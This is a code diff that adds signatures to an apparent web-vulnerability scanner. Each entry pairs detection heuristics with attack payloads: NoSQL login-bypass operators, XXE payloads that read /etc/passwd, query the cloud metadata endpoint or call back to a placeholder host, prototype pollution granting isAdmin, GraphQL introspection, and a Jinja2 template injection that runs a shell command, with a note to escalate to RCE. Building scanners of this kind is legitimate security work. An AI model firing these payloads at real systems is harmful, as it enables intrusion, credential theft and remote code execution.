@@ -240,3 +240,48 @@ export async function runDifferentialAnalysis(cfg: DiffConfig): Promise<DiffResu
   }
   return results;
 }
+
+export const EXTRA_SIGNATURES: VulnSignature[] = [
+  { id:"nosql_boolean_blind", name:"NoSQL Boolean-Blind Injection", severity:"critical", category:"injection",
+    detect(base: string, alt: string): boolean {
+      const d = diff(base, alt);
+      return d.statusChanged || d.lengthDiff > 200 || d.newContent.some((k: string) => ["true","false","null","cannot","cast"].some(t => k.toLowerCase().includes(t)));
+    },
+    payloads:[`{"$gt":""}`,`{"$ne":null}`,`{"$regex":".*"}`,`username[$gt]=&password[$gt]=`,`username[$ne]=invalid&password[$ne]=invalid`],
+    notes:"MongoDB boolean-blind: $gt/$ne/$regex operators cause different response length or content on injection." },
+  { id:"xxe_oob", name:"XXE Out-of-Band (DNS/HTTP)", severity:"critical", category:"injection",
+    detect(base: string, alt: string): boolean {
+      const d = diff(base, alt);
+      return d.newContent.some((k: string) => ["DOCTYPE","ENTITY","<!"].some(t => k.includes(t))) || d.errorRevealed || d.statusChanged;
+    },
+    payloads:[
+      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://CBHOST/xxe">]><foo>&xxe;</foo>`,
+      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
+      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
+    ],
+    notes:"XXE detected via response containing file contents or OOB callback. Try with Content-Type: application/xml." },
+  { id:"graphql_introspection", name:"GraphQL Introspection Enabled", severity:"medium", category:"information-disclosure",
+    detect(base: string, alt: string): boolean {
+      return diff(base, alt).newContent.some((k: string) => ["__schema","queryType","__type","fields"].some(t => k.includes(t)));
+    },
+    payloads:[`{"query":"{__schema{queryType{name}}}"}`,`{"query":"{__schema{types{name,kind}}}"}`],
+    notes:"GraphQL introspection reveals full schema — all types, queries, mutations, arguments." },
+  { id:"prototype_pollution_reflected", name:"Prototype Pollution (Reflected)", severity:"high", category:"injection",
+    detect(base: string, alt: string): boolean {
+      const d = diff(base, alt);
+      return d.newContent.some((k: string) => ["polluted","isAdmin","authorized","admin"].some(t => k.includes(t))) || d.statusChanged;
+    },
+    payloads:[`{"__proto__":{"isAdmin":true}}`,`{"constructor":{"prototype":{"isAdmin":true}}}`,`?__proto__[isAdmin]=true`],
+    notes:"Prototype pollution: if injected properties appear in response or change authorization behavior." },
+  { id:"ssti_jinja2", name:"SSTI Python/Jinja2", severity:"critical", category:"injection",
+    detect(base: string, alt: string): boolean {
+      const d = diff(base, alt);
+      return d.newContent.some((k: string) => k.includes("49") || k.includes("7777777") || k.includes("config") || /\[.*class.*\]/.test(k));
+    },
+    payloads:[`{{7*7}}`,`{{7*'7'}}`,`{{config}}`,`{{lipsum.__globals__['os'].popen('id').read()}}`,`{{''.__class__.__mro__[1].__subclasses__()}}`],
+    notes:"Jinja2 SSTI: 7*7=49 confirms injection. Escalate to __subclasses__ for RCE." },
+];
+
+export function getAllSignatures(): VulnSignature[] {
+  return [...BASE_SIGNATURES, ...EXTRA_SIGNATURES];
+}
